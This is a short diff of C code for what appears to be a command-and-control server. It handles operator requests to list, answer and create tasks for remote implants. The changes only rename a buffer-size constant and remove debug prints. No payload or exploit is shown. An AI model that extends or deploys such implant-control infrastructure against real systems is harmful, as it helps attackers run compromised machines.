@@ -87,11 +87,11 @@ char *interact_with_implant(cJSON *rinfo) {
     const char *action_value = action->valuestring;
     const char *implant_id_value = implant_id->valuestring;
 
-    char *data = malloc(BUFFER_SIZE);
+    char *data = malloc(MAX_INFO);
     if (!data) return strdup("{\"error\": \"Memory allocation failed\"}");
 
     if (strcmp(action_value, "list-tasks") == 0) {
-        snprintf(data, BUFFER_SIZE, "%s", tasks_per_agent(implant_id_value));
+        snprintf(data, MAX_INFO, "%s", tasks_per_agent(implant_id_value));
     } 
     else if (strcmp(action_value, "response-task") == 0) {
         cJSON *task = cJSON_GetObjectItem(rinfo, "task_id");
@@ -100,7 +100,7 @@ char *interact_with_implant(cJSON *rinfo) {
             return strdup("{\"error\": \"Invalid task_id\"}");
         }
         char *data_t = cmd_and_response(task->valueint);
-        snprintf(data, BUFFER_SIZE, "%s", data_t);
+        snprintf(data, MAX_INFO, "%s", data_t);
         free(data_t);
     } 
     else if (strcmp(action_value, "new-task") == 0) {
@@ -175,13 +175,11 @@ void *operator_handler(void *new_sock) {
             send(sock, logs, strlen(logs), 0);
             free(logs);
         } else if (strcmp(about->valuestring, "implant_id") == 0) {
-            printf("IMPLANT ID \n");
             char *data = interact_with_implant(requested_info);
             if (data == NULL) {
                 send(sock, "ERROR", strlen("ERROR"), 0);
                 continue;
             }
-            printf("DATA SENT\n");
             send(sock, data, strlen(data), 0);
             free(data);
         }
@@ -246,7 +244,6 @@ void *Operator_conn(void* port) {
         }
         // Detach thread so resources are automatically freed on exit
         pthread_detach(thread);
-        
     }
 
     close(serverSock);
